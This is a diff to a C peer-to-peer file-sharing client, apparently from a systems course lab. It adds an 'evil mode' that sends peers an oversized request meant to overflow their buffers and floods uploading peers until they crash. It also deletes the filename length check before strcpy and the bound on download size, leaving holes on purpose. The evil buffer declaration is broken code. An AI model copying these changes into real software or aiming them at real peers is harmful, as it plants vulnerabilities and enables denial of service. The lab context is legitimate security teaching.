@@ -286,6 +286,7 @@ int open_socket(struct in_addr addr, int port)
 static size_t read_tracker_response(task_t *t)
 {
 	char *s;
+
 	size_t split_pos = (size_t) -1, pos = 0;
 	t->head = t->tail = 0;
 
@@ -309,11 +310,10 @@ static size_t read_tracker_response(task_t *t)
 
 		// If not, read more data.  Note that the read will not block
 		// unless NO data is available.
-		//TODO: fix bug 
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR)
 			die("tracker read error");
-		else if (ret == TBUF_END)
+		else if (ret == TBUF_END) 
 			die("tracker connection closed prematurely!\n");
 	}
 }
@@ -462,7 +462,6 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	task_t *t = NULL;
 	peer_t *p;
 	size_t messagepos;
-	int i = 0;
 	assert(tracker_task->type == TASK_TRACKER);
 
 	message("* Finding peers for '%s'\n", filename);
@@ -479,12 +478,6 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-	while(filename[i]!='\0'){
-		i++;
-	}
-	//TODO: buffer overrun possible	
-	if (i>FILENAMESIZ)
-		die("File name - %s - too large", filename);
 	strcpy(t->filename, filename);
 
 	// add peers
@@ -511,7 +504,6 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 //	until a download is successful.
 static void task_download(task_t *t, task_t *tracker_task)
 {
-	int sizebound = 0;
 	int i, ret = -1;
 	assert((!t || t->type == TASK_DOWNLOAD)
 	       && tracker_task->type == TASK_TRACKER);
@@ -535,7 +527,12 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	// EVIL: Overflow the buffer!
+	if (evil_mode) {
+		char evilbuf[4294967295] = {'f'};
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evilbuf);
+	} 
+	else osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -566,8 +563,6 @@ static void task_download(task_t *t, task_t *tracker_task)
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
 	while (1) {
-		if(sizebound>100000)
-			goto try_again;
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Peer read error");
@@ -581,7 +576,6 @@ static void task_download(task_t *t, task_t *tracker_task)
 			error("* Disk write error");
 			goto try_again;
 		}
-		sizebound++;
 	}
 
 	// Empty files are usually a symptom of some error.
@@ -676,14 +670,29 @@ static void task_upload(task_t *t)
 	}
 
 	message("* Transferring file %s\n", t->filename);
+	
+	//EVIL: keep writing the same block of data to the peer, over and over.
+	// Don't stop until the other peer crashes.
+	if (evil_mode)
+	{
+		while (1) {
+			int ret = write_from_taskbuf(t->peer_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Peer write error");
+				exit(0);
+			}
+		}
+		goto exit;
+	}
+	
 	// Now, read file from disk and write it to the requesting peer.
-	while (1) {
+	else while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Peer write error");
 			goto exit;
 		}
-
+		
 		ret = read_to_taskbuf(t->disk_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Disk read error");
